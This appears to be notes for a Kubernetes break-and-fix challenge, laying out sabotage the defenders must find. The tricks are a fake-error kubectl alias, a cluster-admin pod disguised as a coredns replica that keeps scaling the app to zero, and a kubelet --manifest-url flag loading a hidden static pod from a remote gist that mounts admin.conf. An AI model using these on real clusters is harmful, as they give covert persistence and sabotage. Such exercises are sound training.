## 1. kubectl alias

- vim `~/.bashrc`
- Add alias for kubectl to be an echo of the default message when kubectl is not configure with KUBECONFIG, when they configure KUBECONFIG it would like it didn't work
```
alias kubectl='The connection to the server localhost:8080 was refused - did you specify the right host or port?'
```

## 2. ed Editor

Set the default editor for kubectl, for example when doing `kubectl edit`, then they try to edit the deployment that has replicas 0, they will not be able to edit the yaml

- vim /etc/profile
- add environment variable
```
export KUBE_EDITOR=ed
```

## 3. scale to zero: hidden in coredns

The cluster has a deployment of coredns in namespace `kube-system` with 2 replicas, lets make it 1 replica, and create a pod that looks like the second valid coredns but this pod what is going to run is a `kubectl` while loop script that scales the deployment of the app to zero.

Grant permission with clusterolebinding for the sa `default` in ns `kube-system`

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: system:coredns:admin
subjects:
- kind: ServiceAccount
  name: default # name of your service account
  namespace: kube-system # this is the namespace your service account is in
roleRef: # referring to your ClusterRole
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

Create the downscaler pod
```yaml
apiVersion: v1
kind: Pod
metadata:
  labels:
    app: coredns
  name: coredns-64897985d-rwdzx
  namespace: kube-system
spec:
  containers:
  - image: bitnami/kubectl
    name: coredns
    command: ["/bin/sh", "-ec", "while :; do kubectl scale deployment klustered --namespace default --replicas 0; sleep 5 ; done"]
```

It would be very difficult to detect as the pod will show as `coredns-64897985d-rwdzx` one of the valid coredns pods.

## 4. scale to zero: hidden in kubelet flag

Lets apply the same brake twice to scale down to zero the deployment, this way if they fix the first version, they might think it didn't work and try to see why it didn't work, but in fact is this second brake also downscalign the deployment to zero.

Lets create the downscaler static pod and will start it by using the kubelet flag `--manifest-url`


Since this is a static pod we can't use the service account, we need to mount in a volume the kubeconfig from the control plane node. Will give it a name that looks like one of the control plane controllers (ie "resolver")

```yaml
apiVersion: v1
kind: Pod
metadata:
  labels:
    app: coredns
  name: kube-resolver
  namespace: kube-system
spec:
  containers:
  - image: bitnami/kubectl
    name: coredns
    command: ["/bin/sh", "-ec", "while :; do kubectl --kubeconfig=/etc/kubernetes/admin.conf scale deployment klustered --namespace default --replicas 0; sleep 5 ; done"]
    volumeMounts:
    - mountPath: /etc/kubernetes/admin.conf
      name: kubeconfig
  volumes:
  - name: kubeconfig
    hostPath:
      path: /etc/kubernetes/admin.conf
      type: FileOrCreate
```

Create this file in remote location url, for example I used a GitHub gist: https://gist.githubusercontent.com/csantanapr/242dc4a47633a35e8fcb87aadfd337ae/raw/d991b03448ad5bbddab0325b80fe60b62c81e997/kubeletpod.yaml

Then on the control plane node edit the systemd kubelet service file
- `chmod +r /etc/kubernetes/admin.conf`
- vim `/etc/systemd/system/kubelet.service.d/10-kubeadm.conf`
- Add the flag to `--manifest-url=https://gist.githubusercontent.com/csantanapr/242dc4a47633a35e8fcb87aadfd337ae/raw/d991b03448ad5bbddab0325b80fe60b62c81e997/kubeletpod.yaml`
- run `systemctl daemon-reload`
- run `systemctl restart kubelet`

A new pod will show up in `kube-system` namespace as `kube-scheduler-<wokernode-names>`
 and it will look like one of the other normal control pods (ie scheduler, controller)

